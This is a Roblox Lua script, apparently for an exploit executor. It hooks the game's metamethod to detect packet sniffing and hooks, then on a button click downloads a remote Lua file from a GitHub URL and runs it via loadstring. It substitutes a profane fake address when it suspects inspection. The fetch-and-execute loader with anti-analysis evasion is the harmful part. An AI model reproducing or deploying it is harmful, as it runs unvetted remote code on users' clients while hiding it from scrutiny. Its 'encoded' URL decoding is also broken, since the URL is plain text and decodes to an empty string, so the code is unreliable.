--[[
    📌 Roblox 防抓包 + 防 Hook 脚本（不卡优化）
    放到 StarterPlayerScripts ➜ LocalScript
]]

local Players = game:GetService("Players")
local player = Players.LocalPlayer

--===[ 🔒 核心 URL 用转义隐藏 ]===
local encodedURL = "https://raw.githubusercontent.com/CNHM/asg/refs/heads/main/hm.lua"

local isHooked = false

--===[ 🪤 只 Hook 一次，后续只对比是否被篡改 ]===
local success, mt = pcall(getrawmetatable, game)
local originalNamecall = nil

if success and mt then
    pcall(function()
        setreadonly(mt, false)
        originalNamecall = mt.__namecall

        mt.__namecall = function(...)
            warn("[⚠️ 检测到 __namecall 被 Hook]")
            isHooked = true
            return originalNamecall(...)
        end
    end)
end

--===[ 🪤 定时轻量对比 Hook 是否被覆盖（不卡） ]===
task.spawn(function()
    while task.wait(5) do
        local mtCheck = getrawmetatable(game)
        if mtCheck and mtCheck.__namecall ~= originalNamecall then
            warn("[⚠️ 检测到 __namecall 被篡改！]")
            isHooked = true
        end
    end
end)

--===[ 🗔 创建弹窗 UI ]===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiSniffUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0.5, -100, 0.5, -25)
button.Text = "点我执行脚本"
button.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.SourceSansBold
button.TextSize = 24
button.Parent = frame

--===[ ✅ 按钮防抖 + 执行脚本 ]===
local clicked = false

button.MouseButton1Click:Connect(function()
    if clicked then
        warn("已点击，防抖保护")
        return
    end
    clicked = true

    local finalURL = nil

    if isHooked then
        warn("⚠️ 检测到 Hook 抓包，使用假地址！")
        finalURL = "抓你妈"
    else
        -- 转义解码
        local bytes = {}
        for num in encodedURL:gmatch("\\(%d+)") do
            table.insert(bytes, tonumber(num))
        end
        finalURL = string.char(unpack(bytes))
    end

    print("🚀 正在执行：", finalURL)

    local success, err = pcall(function()
        loadstring(game:HttpGet(finalURL))()
    end)

    if success then
        print("✅ 执行成功")
    else
        warn("⚠️ 执行失败：", err)
    end
end)
